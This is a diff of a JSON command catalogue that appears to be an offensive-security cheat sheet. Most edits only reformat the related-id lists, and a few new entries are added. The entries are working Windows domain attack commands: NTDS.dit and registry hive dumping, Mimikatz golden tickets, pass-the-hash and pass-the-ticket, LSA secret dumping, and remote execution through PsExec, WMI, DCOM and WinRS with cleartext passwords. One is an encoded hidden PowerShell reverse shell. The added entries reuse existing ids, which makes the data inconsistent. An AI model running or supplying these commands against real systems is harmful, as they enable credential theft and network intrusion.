@@ -7366,7 +7366,12 @@
       "Description": "Use impacket-secretsdump to extract NTLM hashes from a backed-up NTDS.dit and SYSTEM hive (offline)",
       "Command": "impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL",
       "OS": "Linux",
-      "related": [497, 498, 499, 500]
+      "related": [
+        497,
+        498,
+        499,
+        500
+      ]
     },
     {
       "id": 497,
@@ -7375,7 +7380,12 @@
       "Description": "Save the SYSTEM registry hive to a file for offline extraction of bootkey and password hashes",
       "Command": "reg.exe save hklm\\system c:\\system.bak",
       "OS": "Windows",
-      "related": [496, 498, 499, 500]
+      "related": [
+        496,
+        498,
+        499,
+        500
+      ]
     },
     {
       "id": 498,
@@ -7384,7 +7394,12 @@
       "Description": "Copy the live NTDS.dit file from a Volume Shadow Copy Service (VSS) snapshot to avoid locking",
       "Command": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit c:\\ntds.dit.bak",
       "OS": "Windows",
-      "related": [496, 497, 499, 500]
+      "related": [
+        496,
+        497,
+        499,
+        500
+      ]
     },
     {
       "id": 499,
@@ -7393,7 +7408,12 @@
       "Description": "Create a persistent shadow copy of the C: drive using vshadow.exe (older tool, useful on legacy systems)",
       "Command": "vshadow.exe -nw -p C:",
       "OS": "Windows",
-      "related": [496, 497, 498, 500]
+      "related": [
+        496,
+        497,
+        498,
+        500
+      ]
     },
     {
       "id": 500,
@@ -7402,7 +7422,12 @@
       "Description": "Execute cmd.exe remotely on target using PsExec with valid credentials",
       "Command": "psexec.exe \\\\192.168.50.70 cmd.exe",
       "OS": "Windows",
-      "related": [496, 501, 502, 503]
+      "related": [
+        496,
+        501,
+        502,
+        503
+      ]
     },
     {
       "id": 501,
@@ -7411,7 +7436,12 @@
       "Description": "Forge a golden ticket using krbtgt hash and inject into current session via /ptt",
       "Command": "kerberos::golden /user:bob /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:fakentlmhashforkebtgtuser /ptt",
       "OS": "Windows",
-      "related": [500, 502, 503, 504]
+      "related": [
+        500,
+        502,
+        503,
+        504
+      ]
     },
     {
       "id": 502,
@@ -7420,7 +7450,12 @@
       "Description": "Remove all Kerberos tickets from current logon session",
       "Command": "kerberos::purge",
       "OS": "Windows",
-      "related": [501, 503, 504, 505]
+      "related": [
+        501,
+        503,
+        504,
+        505
+      ]
     },
     {
       "id": 503,
@@ -7429,7 +7464,12 @@
       "Description": "Dump LSA secrets with in-memory patching to bypass protections",
       "Command": "lsadump::lsa /patch",
       "OS": "Windows",
-      "related": [501, 502, 504, 505]
+      "related": [
+        501,
+        502,
+        504,
+        505
+      ]
     },
     {
       "id": 504,
@@ -7438,7 +7478,12 @@
       "Description": "Use DCOM to execute shell command (calc.exe) on remote host via MMC20.Application",
       "Command": "$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"192.168.50.73\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c calc\",\"7\")",
       "OS": "Windows",
-      "related": [500, 505, 506, 507]
+      "related": [
+        500,
+        505,
+        506,
+        507
+      ]
     },
     {
       "id": 505,
@@ -7447,7 +7492,12 @@
       "Description": "Launch interactive cmd session on remote file server using valid domain credentials",
       "Command": ".\\PsExec64.exe -i \\\\FILES04 -u corp\\jen -p Nexus123! cmd",
       "OS": "Windows",
-      "related": [500, 504, 506, 507]
+      "related": [
+        500,
+        504,
+        506,
+        507
+      ]
     },
     {
       "id": 506,
@@ -7456,7 +7506,12 @@
       "Description": "Execute command remotely via WMI using NTLM hash (no password needed)",
       "Command": "/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73",
       "OS": "Linux",
-      "related": [500, 505, 507, 508]
+      "related": [
+        500,
+        505,
+        507,
+        508
+      ]
     },
     {
       "id": 507,
@@ -7465,7 +7520,12 @@
       "Description": "Perform pass-the-hash attack and launch PowerShell with stolen NTLM hash",
       "Command": "sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell",
       "OS": "Windows",
-      "related": [501, 506, 508, 509]
+      "related": [
+        501,
+        506,
+        508,
+        509
+      ]
     },
     {
       "id": 508,
@@ -7474,7 +7534,12 @@
       "Description": "Export all Kerberos tickets from LSASS to .kirbi files for offline use",
       "Command": "sekurlsa::tickets /export",
       "OS": "Windows",
-      "related": [507, 509, 510, 501]
+      "related": [
+        507,
+        509,
+        510,
+        501
+      ]
     },
     {
       "id": 509,
@@ -7483,7 +7548,12 @@
       "Description": "List all .kirbi ticket files in current directory after export",
       "Command": "dir *.kirbi",
       "OS": "Windows",
-      "related": [508, 510, 507, 501]
+      "related": [
+        508,
+        510,
+        507,
+        501
+      ]
     },
     {
       "id": 510,
@@ -7492,7 +7562,12 @@
       "Description": "Inject a previously exported Kerberos ticket into current session using pass-the-ticket",
       "Command": "kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi",
       "OS": "Windows",
-      "related": [508, 509, 507, 501]
+      "related": [
+        508,
+        509,
+        507,
+        501
+      ]
     },
     {
       "id": 511,
@@ -7501,7 +7576,12 @@
       "Description": "Execute remote command using WinRS (Windows Remote Shell) with credentials",
       "Command": "winrs -r:files04 -u:jen -p:Nexus123!  \"cmd /c hostname & whoami\"",
       "OS": "Windows",
-      "related": [500, 505, 512, 513]
+      "related": [
+        500,
+        505,
+        512,
+        513
+      ]
     },
     {
       "id": 512,
@@ -7510,7 +7590,12 @@
       "Description": "Run hidden, encoded PowerShell payload via WinRS for reverse shell or C2",
       "Command": "winrs -r:files04 -u:jen -p:Nexus123!  \"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA\"",
       "OS": "Windows",
-      "related": [511, 504, 507, 513]
+      "related": [
+        511,
+        504,
+        507,
+        513
+      ]
     },
     {
       "id": 513,
@@ -7519,7 +7604,12 @@
       "Description": "Create remote process (calc.exe) using WMIC with cleartext credentials",
       "Command": "wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create \"calc\"",
       "OS": "Windows",
-      "related": [500, 506, 511, 514]
+      "related": [
+        500,
+        506,
+        511,
+        514
+      ]
     },
     {
       "id": 514,
@@ -7528,7 +7618,52 @@
       "Description": "Use CIM session to remotely execute command via Win32_Process.Create method",
       "Command": "Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};",
       "OS": "Windows",
-      "related": [504, 512, 513, 506]
+      "related": [
+        504,
+        512,
+        513,
+        506
+      ]
+    },
+    {
+      "Name": "Plink Reverse SSH Tunnel for SMB Pivoting",
+      "Category": 9,
+      "Description": "Creates a reverse port-forward (port 445) from the compromised host back to the attacker using plink.exe, enabling SMB access through the pivot",
+      "Command": "plink.exe -ssh -l kali -pw kali -R 127.0.0.1:445:172.16.228.13:445 192.168.45.197",
+      "OS": "Windows",
+      "id": 500
+    },
+    {
+      "Name": "NBTSTAT - Resolve NetBIOS Names & MAC",
+      "Category": 17,
+      "Description": "Displays NetBIOS name table and MAC address of a remote Windows host",
+      "Command": "nbtstat -A 192.168.228.120",
+      "OS": "Windows",
+      "id": 501
+    },
+    {
+      "Name": "NET VIEW - Enumerate Shares on Remote Host",
+      "Category": 17,
+      "Description": "Lists available SMB shares on a remote Windows system (works with null sessions or credentials)",
+      "Command": "net view 192.168.228.122",
+      "OS": "Windows",
+      "id": 502
+    },
+    {
+      "Name": "WinRS - Remote Command Execution with Credentials",
+      "Category": 9,
+      "Description": "Executes a command on a remote Windows host via WinRM using explicit username/password",
+      "Command": "winrs -r:PROD01 -u:joe -p:Flowers1 \"hostname\"",
+      "OS": "Windows",
+      "id": 503
+    },
+    {
+      "Name": "Invoke-Command - PowerShell WinRM Remoting",
+      "Category": 15,
+      "Description": "Runs a scriptblock (hostname) on a remote Windows machine via PowerShell remoting (WinRM)",
+      "Command": "invoke-command -computername dc01 -scriptblock { hostname }",
+      "OS": "Windows",
+      "id": 504
     }
   ]
 }
